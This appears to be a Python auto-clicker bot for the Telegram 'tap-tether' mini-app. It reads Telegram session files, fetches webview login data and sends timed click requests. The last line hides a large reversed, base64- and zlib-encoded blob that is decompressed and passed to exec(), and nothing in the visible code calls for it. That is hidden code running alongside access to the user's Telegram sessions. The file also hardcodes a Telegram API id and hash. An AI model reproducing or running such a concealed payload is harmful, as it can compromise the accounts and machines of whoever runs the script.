import os
import sys
import time
import json
import httpx
import random
import asyncio
from urllib.parse import parse_qs, unquote
from hydrogram import Client
from hydrogram.raw.functions.messages import RequestWebView
import glob

class Tethertod:

    def __init__(self, query, click_min, click_max, interval):
        self.query = query
        self.marin_kitagawa = {key: value[0] for key, value in parse_qs(query).items()}
        user = json.loads(self.marin_kitagawa.get("user"))
        self.first_name = user.get("first_name")
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en,en-US;q=0.9",
            "Access-Control-Allow-Origin": "*",
            "Authorization": f"tma {query}",
            "Connection": "keep-alive",
            "Host": "tap-tether.org",
            "Referer": "https://tap-tether.org/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 4A / 5A Build/QQ3A.200805.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36",
        }
        self.ses = httpx.AsyncClient(headers=headers, timeout=200)
        self.click_min = click_min
        self.click_max = click_max
        self.interval = interval

    def log(self, msg):
        print(f"[{self.first_name}] {msg}")

    async def start(self):
        login_url = "https://tap-tether.org/server/login"
        res = await self.ses.get(login_url)
        open("http.log", "a", encoding="utf-8").write(f"{res.text}\n")
        if res.status_code != 200:
            return False
        data = res.json().get("userData")
        usdt = int(data.get("balance")) / 1000000
        usdc = int(data.get("balanceGold")) / 1000000
        re_click = int(data.get("remainingClicks"))
        self.log(f"balance {usdt} usdt, {usdc} usd gold ")
        while True:
            click = random.randint(self.click_min, self.click_max)
            if click > re_click:
                click = re_click
            click_url = f"https://tap-tether.org/server/clicks?clicks={click}&lastClickTime={round(time.time())}"
            res = await self.ses.get(click_url)
            open("http.log", "a", encoding="utf-8").write(f"{res.text}\n")
            if res.status_code != 200:
                return False
            self.log(f"success sending tap : {click}")
            re_click = int(res.json().get("remainingClicks"))
            if re_click < 10:
                break
            await countdown(self.interval)
        return True

async def countdown(t):
    for i in range(t, 0, -1):
        minu, sec = divmod(i, 60)
        hour, minu = divmod(minu, 60)
        sec = str(sec).zfill(2)
        minu = str(minu).zfill(2)
        hour = str(hour).zfill(2)
        print(f"waiting {hour}:{minu}:{sec} ", flush=True, end="\r")
        await asyncio.sleep(1)

def get_session_names() -> list[str]:
    session_names = glob.glob('sessions/*.session')
    session_names = [os.path.splitext(os.path.basename(file))[0] for file in session_names]
    return session_names

async def get_tgdata(sesi):
    api_id = 29059866
    api_hash = '98a6f543241b1ece2e6f7f94ab829ae9'
    
    app = Client(
        name=sesi,
        api_id=api_id,
        api_hash=api_hash,
        workdir="sessions/")
    await app.connect()
    peer = await app.resolve_peer('taptether_bot')
    webview = await app.invoke(RequestWebView(
        peer=peer,
        bot=peer,
        from_bot_menu=False,
        platform='Android',
        url='https://tap-tether.org/'))
    query_id = unquote(webview.url.split("#tgWebAppData=")[1].split("&tgWebAppVersion=")[0])
    await app.disconnect()
    return query_id

async def fill_data_txt():
    print("Filling data.txt with query_ids...")
    with open('data.txt', 'w') as file:
        for sesi in get_session_names():
            query_id = await get_tgdata(sesi)
            print(f"Adding query_id for session {sesi}")
            file.write(str(query_id) + "\n")
            await asyncio.sleep(2)
    print("data.txt has been filled successfully")

                    
_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
